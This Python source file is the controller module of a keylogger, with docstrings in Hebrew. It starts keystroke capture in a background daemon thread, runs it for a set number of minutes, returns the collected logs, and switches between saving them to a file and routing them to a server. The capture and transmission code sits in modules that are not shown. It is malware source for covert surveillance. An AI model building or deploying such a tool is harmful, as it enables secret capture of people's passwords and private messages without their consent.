import threading
import logging
from keylogger import KeyLogger
from encryption import EncryptorDecryptor
from file_handler import JSONFileHandler

logger = logging.getLogger(__name__)


class Manager:
    _instance = None

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            encryptor = EncryptorDecryptor()
            storage = JSONFileHandler()
            cls._instance.key_logger = KeyLogger(encryptor, storage)
        return cls._instance

    def start_logging(self):
        """מתחיל את ההקלטה."""
        if not self.key_logger.is_running:
            self.thread = threading.Thread(target=self.key_logger.start, daemon=True)
            self.thread.start()
            logger.info("Keylogger started in background.")

    def stop_logging(self):
        """מפסיק את ההקלטה."""
        self.key_logger.stop_listen()

    def run_time(self, minutes: int):
        """מריץ את ההקלטה לזמן מוגדר."""
        self.key_logger.start(minutes)

    def get_logs(self):
        """מחזיר את כל הלוגים."""
        return JSONFileHandler.read_logs()

    def set_routing(self, routing_type: str):
        """משנה את הניתוב של ה-KeyLogger."""
        if routing_type in ['file', 'server']:
            self.key_logger.routing = routing_type
            logger.info(f"Routing changed to: {routing_type}")
        else:
            logger.error(f"Invalid routing type: {routing_type}")
